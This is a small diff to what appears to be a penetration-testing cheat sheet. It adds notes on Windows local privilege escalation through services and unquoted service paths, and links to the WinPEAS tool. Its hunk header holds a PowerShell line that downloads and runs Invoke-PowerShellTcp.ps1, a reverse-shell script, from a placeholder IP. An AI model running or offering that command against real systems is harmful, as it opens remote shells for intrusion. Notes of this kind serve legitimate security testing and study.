@@ -397,7 +397,8 @@ Powershell.exe iex (iwr http://xx.xx.xx.xx/Invoke-PowerShellTcp.ps1 -UseBasicPar
 # Local privilege escalation
 Focusing on Service issues
 
-*Only target Services you can restart*
+*Only target Services you can restart.*
+*Also, do not target an unqouted service path abuse when it would require dropping the .exe in C:\  - you need local admin rights to write there.
 #### WinPeas
 https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS
 
